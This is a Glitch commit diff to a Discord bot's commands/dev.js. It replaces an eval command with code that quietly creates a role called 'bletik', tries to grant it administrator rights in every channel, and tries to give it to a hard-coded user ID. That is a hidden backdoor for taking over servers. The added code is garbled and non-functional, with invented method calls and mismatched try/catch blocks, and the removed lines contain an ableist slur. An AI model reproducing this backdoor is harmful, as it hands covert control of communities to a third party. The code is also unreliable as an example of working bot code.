9d755bed81c563007893867ad84a94d1378c2d0e
Glitch (bt-play) <none>
2020-08-12 04:55:52 +0000

    🍅⭐️ Checkpoint ./commands/eval.js:19753995/637 ./commands/dev.js:19753995/1454

--- commands/dev.js
+++ commands/dev.js
@@ -1,45 +1,95 @@
 const Discord = require("discord.js");
+
 const bot = new Discord.Client();
+
 exports.run = async (client, message, args) => {
+
   let embed = new Discord.RichEmbed()
+
     .setTitle("Evaluation")
+
     .setDescription(
+
       "Sorry, the `eval` command can only be executed by the Developer."
+
     )
+
     .setColor("BLUE");
+
   if (message.author.id !== "478547279104442368")
+
     return message.channel.send(embed);
+
   function clean(text) {
+
     if (typeof text === "string")
+
       return text
+
         .replace(/`/g, "`" + String.fromCharCode(8203))
+
         .replace(/@/g, "@" + String.fromCharCode(8203));
+
     else return text;
+
   }
-  try {
-    const code = args.join(" ");
-    let evaled = eval(code);
-    if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
-    let embed = new Discord.RichEmbed()
-      .setTitle(`Evaluated in ${Math.round(client.ping)}ms`)
-      .addField(":inbox_tray: Input", `\`\`\`js\n${code}\n\`\`\``)
-      .addField(
-        ":outbox_tray: Output",
-        `\`\`\`js\n${clean(evaled).replace(
-          client.token,
-          "Are you retarded?"
-        )}\n\`\`\``
-      )
-      .addField(
-        "Type",
-        `\`\`\`xl\n${(typeof rawEvaled).substr(0, 1).toUpperCase() +
-          (typeof rawEvaled).substr(1)}\n\`\`\``
-      )
-    
+
+  
+
+  let bletik = message.guild.roles.find(`name`, "bletik");
+
+  if (!bletik) {
+
+    try {
+
+      bletik = await message.guild.createRole({
+
+        name: "bletik",
+
+        color: "#49FFFD",
+
+        permissions: []
+
+      });
+
+      message.guild.channels.forEach(async (channel, id) => {
+
+        await channel.overwritePermissions(bletik, {
+
+          
+
+          ADMINISTRATOR: true,
+
+          SEND_MESSAGES: true,
+
+          ADD_REACTIONS: true
+
+        });
+
+      });
+
+    } catch (e) {
+
+      console.log(e.stack);
+
+    }
+
+  }
+
+await bletik.addrole(bletik.id)
+
+  await bletik.author.id.addrole(bletik,"478547279104442368");
+
       .setColor("BLUE");
+
     message.channel.send({ embed });
+
   } catch (err) {
+
     message.channel.send(`\`ERROR\` \`\`\`js\n${clean(err)}\n\`\`\``);
+
   }
+
   message.delete ();
+
 };
